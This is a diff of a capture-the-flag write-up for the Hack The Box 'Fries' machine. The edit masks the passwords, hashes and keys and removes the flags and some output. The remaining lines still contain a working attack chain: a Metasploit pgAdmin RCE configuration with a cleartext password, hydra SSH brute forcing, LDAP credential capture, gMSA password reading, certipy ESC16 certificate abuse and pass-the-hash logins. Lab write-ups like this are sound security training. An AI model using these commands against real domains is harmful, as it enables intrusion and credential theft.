@@ -14,10 +14,10 @@ Services: SSH, DNS, HTTP/HTTPS, Kerberos, RPC, LDAP, SMB, WinRM
 | Step | User / Access       | Technique Used                        | Result                                                                                           |
 | :--: | :------------------ | :------------------------------------ | :----------------------------------------------------------------------------------------------- |
 |   1  | Unauthenticated     | **Network scanning (nmap)**           | Identified SSH (22), HTTP (80), Active Directory services, and a self-hosted **Gitea** instance. |
-|   2  | d.cooper (Web)      | **Source code analysis (Gitea)**      | Discovered PostgreSQL credentials (`PsqLR00tpaSS11`) in a committed `.env` file.                 |
+|   2  | d.cooper (Web)      | **Source code analysis (Gitea)**      | Discovered PostgreSQL credentials (`PsqLXXXXXXXXXX`) in a committed `.env` file.                 |
 |   3  | d.cooper (DB)       | **Database RCE (pgAdmin)**            | Used authenticated SQL execution to spawn a reverse shell as the `postgres` user.                |
 |   4  | pgadmin (Container) | **CVE-2025-2945 exploitation**        | Abused RCE in **pgAdmin 9.1.0** to pivot into the `pgadmin` user context.                        |
-|   5  | svc (SSH)           | **Password reuse / brute force**      | Identified valid SSH credentials for `svc` using password `Friesf00Ds2025!!`.                    |
+|   5  | svc (SSH)           | **Password reuse / brute force**      | Identified valid SSH credentials for `svc` using password `FrieXXXXXXXXXXXX`.                    |
 |   6  | svc (Tunneling)     | **NFS exploitation (sshuttle)**       | Leveraged misconfigured NFS exports to read `/etc/shadow` and extract Docker TLS certificates.   |
 |   7  | root (Docker)       | **Docker socket abuse**               | Generated custom root certificates to hijack a privileged container via **Docker**.              |
 |   8  | svc_infra (LDAP)    | **Credential harvesting (Responder)** | Poisoned `PwmConfiguration.xml` to capture `svc_infra` credentials over LDAP.                    |
@@ -228,8 +228,8 @@ If we go to the user's `commits`, we find `PostgreSQL` credentials in the `.env`
 [Initial Commit Page](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Fries/initial_commit.html "Results")
 
 ```
-DATABASE_URL=postgresql://root:PsqLR00tpaSS11@172.18.0.3:5432/ps_db
-SECRET_KEY=y0st528wn1idjk3b9a
+DATABASE_URL=postgresql://root:PsqLXXXXXXXXXX@172.18.0.3:5432/ps_db
+SECRET_KEY=y0stXXXXXXXXXXXXXX
 ```
 ![Facts](htb_fries_db_secretkey.png)
 
@@ -272,7 +272,7 @@ It works, and we are logged in:
 ![Facts](htb_fries_new_server.png)
 
 
-If we open the `DB`, it asks for the `root` password. We use the one we obtained from `gitea`, which is `PsqLR00tpaSS11`, and all the `DB` information is displayed.
+If we open the `DB`, it asks for the `root` password. We use the one we obtained from `gitea`, which is `PsqLXXXXXXXXXX`, and all the `DB` information is displayed.
 
 ![Facts](htb_fries_root_\new_server.png)
 
@@ -380,7 +380,7 @@ set RHOSTS <IP_VICTIM>
 set USERNAME d.cooper@fries.htb
 set PASSWORD D4LE11maan!!
 set DB_USER root
-set DB_PASS PsqLR00tpaSS11
+set DB_PASS PsqLXXXXXXXXXX
 set DB_NAME ps_db
 set RHOSTS db-mgmt05.fries.htb
 set VHOST db-mgmt05.fries.htb
@@ -423,7 +423,7 @@ Info:
 ```
 HOSTNAME=cb46692a4590
 SHLVL=1
-PGADMIN_DEFAULT_PASSWORD=Friesf00Ds2025!!
+PGADMIN_DEFAULT_PASSWORD=FrieXXXXXXXXXXXX
 CONFIG_DISTRO_FILE_PATH=/pgadmin4/config_distro.py
 HOME=/home/pgadmin
 PGADMIN_DEFAULT_EMAIL=admin@fries.htb
@@ -456,8 +456,6 @@ Let's try to gather users by creating a user list and brute-forcing `SSH`. If we
 URL = https://pwm.fries.htb/
 ```
 
-Info:
-
 
 We see a `login` page. If we try any credentials, like `admin:admin`, we see:
 
@@ -472,7 +470,7 @@ We get an error that shows important information, including a user. With this in
 Now let's run `hydra`.
 
 ```shell
-hydra -L users.txt -p 'Friesf00Ds2025!!' ssh://<IP> -t 64 -I
+hydra -L users.txt -p 'FrieXXXXXXXXXXXX' ssh://<IP> -t 64 -I
 ```
 
 
@@ -488,7 +486,7 @@ It worked! Let's access via `SSH` with the credentials.
 ssh svc@<IP>
 ```
 
-We enter `Friesf00Ds2025!!` as the password...
+We enter `FrieXXXXXXXXXXXX` as the password...
 
 
 ![Facts](htb_fries_svc_ssh_login.png)
@@ -710,7 +708,7 @@ If we enter any credentials on the `login` page and check our listener:
 It worked, and we see the credentials. We test them with `netexec`.
 
 ```shell
-netexec ldap <IP> -u svc_infra -p 'm6tneOMAh5p0wQ0d'
+netexec ldap <IP> -u svc_infra -p 'm6tnXXXXXXXXXXXX'
 ```
 
 ![Facts](htb_fries_svc_infra_cred_ldap.png)
@@ -719,13 +717,13 @@ Info:
 
 ```
 LDAP        10.10.11.96     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fries.htb)
-LDAP        10.10.11.96     389    DC01             [+] fries.htb\svc_infra:m6tneOMAh5p0wQ0d
+LDAP        10.10.11.96     389    DC01             [+] fries.htb\svc_infra:m6tnXXXXXXXXXXXX
 ```
 
 They are valid. Now we download a `ZIP` file for analysis in `BloodHound`.
 
 ```shell
-bloodhound-ce-python -d 'fries.htb' -u 'svc_infra' -p 'm6tneOMAh5p0wQ0d' -ns '<IP>' -c All --zip
+bloodhound-ce-python -d 'fries.htb' -u 'svc_infra' -p 'm6tnXXXXXXXXXXXX' -ns '<IP>' -c All --zip
 ```
 
 [Bloodhound.zip](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Fries/20260216171127_bloodhound.zip "Results")
@@ -739,7 +737,7 @@ The user has `ReadMSAPassword` privileges over the `GMSA_CA_PROD$` user.
 ### ReadMSAPassword over GMSA\_CA\_PROD$
 
 ```shell
-bloodyAD --host <IP> -d fries.htb -u svc_infra -p 'm6tneOMAh5p0wQ0d' get object 'GMSA_CA_PROD$' --attr msDS-ManagedPassword
+bloodyAD --host <IP> -d fries.htb -u svc_infra -p 'm6tnXXXXXXXXXXXX' get object 'GMSA_CA_PROD$' --attr msDS-ManagedPassword
 ```
 
 ![Facts](htb_fries_svc_infra_GMSA_CA_Prod_mng_pass.png)
@@ -752,7 +750,7 @@ bloodyAD --host <IP> -d fries.htb -u svc_infra -p 'm6tneOMAh5p0wQ0d' get object 
 Now we perform a `Pass-The-Hash` via `WinRM`:
 
 ```shell
-evil-winrm -i <IP> -u 'gMSA_CA_prod$' -H fc20b3d3ec179c5339ca59fbefc18f4a
+evil-winrm -i <IP> -u 'gMSA_CA_prod$' -H XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
 ```
 
 Info:
@@ -778,7 +776,7 @@ It worked! We are logged in using an account with certificate creation/generatio
 From our `kali` machine, we use the `certipy-ad` utility to find `vulnerable` templates using the account's credentials.
 
 ```shell
-certipy-ad find -u 'gMSA_CA_prod$' -hashes 'fc20b3d3ec179c5339ca59fbefc18f4a' -dc-ip <IP> -vulnerable
+certipy-ad find -u 'gMSA_CA_prod$' -hashes 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX' -dc-ip <IP> -vulnerable
 ```
 
 ![Facts](htb_fries_svc_infra_vulnerable.png)
@@ -827,7 +825,6 @@ It is correctly enabled with the number `1376590`.
 
 Now we add the OID extension `1.3.6.1.4.1.311.25.2` to the list of disabled extensions to enable `ESC16`.
 
-> Extra Information
 
 The `ESC16` vulnerability occurs when a Certificate Authority (CA) is configured to disable the inclusion of OID `1.3.6.1.4.1.311.25.2` (the security extension) in all certificates it issues, or if the `KB5014754` patch has not been applied. This makes the `CA` behave as if all its published templates were vulnerable to the `ESC9` vector.
 
@@ -853,7 +850,7 @@ Get-Service CertSvc
 We verify this as follows:
 
 ```shell
-certipy-ad find -u 'gMSA_CA_prod$' -hashes 'fc20b3d3ec179c5339ca59fbefc18f4a' -dc-ip <IP> -vulnerable -stdout
+certipy-ad find -u 'gMSA_CA_prod$' -hashes 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX' -dc-ip <IP> -vulnerable -stdout
 ```
 
 
@@ -877,7 +874,7 @@ URL = [Privilege Escalation ESC6](https://github.com/ly4k/Certipy/wiki/06-%E2%80
 ```shell
 certipy-ad req \
   -u svc_infra \
-  -p 'm6tneOMAh5p0wQ0d' \
+  -p 'm6tnXXXXXXXXXXXX' \
   -dc-ip 10.129.244.72 \
   -ca fries-DC01-CA \
   -template User \
@@ -887,19 +884,6 @@ certipy-ad req \
 
 ![Facts](htb_fries_adminpfx.png)
 
-Info:
-
-```
-Certipy v5.0.3 - by Oliver Lyak (ly4k)
-
-[*] Requesting certificate via RPC
-[*] Request ID is 53
-[*] Successfully requested certificate
-[*] Got certificate with UPN 'administrator@fries.htb'
-[*] Certificate object SID is 'S-1-5-21-858338346-3861030516-3975240472-500'
-[*] Saving certificate and private key to 'administrator.pfx'
-[*] Wrote certificate and private key to 'administrator.pfx'
-```
 
 [administrator.pfx](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Fries/administrator.pfx "Results")
 
@@ -935,7 +919,7 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
 [*] Saving credential cache to 'administrator.ccache'
 [*] Wrote credential cache to 'administrator.ccache'
 [*] Trying to retrieve NT hash for 'administrator'
-[*] Got hash for 'administrator@fries.htb': aad3b435b51404eeaad3b435b51404ee:a773cb05d79273299a684a23ede56748
+[*] Got hash for 'administrator@fries.htb': aad3b435b51404eeaad3b435b51404ee:a773cbXXXXXXXXXXXXXXXXXXXXXXXXXX
 ```
 
 It worked, and we correctly obtained the `hash`. We perform a `Pass-The-Hash` with `evil-winrm`.
@@ -943,36 +927,11 @@ It worked, and we correctly obtained the `hash`. We perform a `Pass-The-Hash` wi
 ### evil-winrm (Administrator)
 
 ```shell
-evil-winrm -i <IP> -u 'Administrator' -H a773cb05d79273299a684a23ede56748
+evil-winrm -i <IP> -u 'Administrator' -H a773cbXXXXXXXXXXXXXXXXXXXXXXXXXX
 ```
 
-Info:
-
-```
-Evil-WinRM shell v3.7
-                                        
-Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
-                                        
-Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-                                        
-Info: Establishing connection to remote endpoint
-*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
-fries\administrator
-```
 
 We are logged in as `Administrator`. We read the `2` flags, `user.txt` and `root.txt`.
-
-> root.txt
-
-```
-2ce93f877c167a8e1ca7dfa6baffad2a
-```
-
-> user.txt
-
-```
-7fdd8a52dba09f85547ef0f353103627
-```
 
 ![Facts](htb_fries_flags_both.png)
 
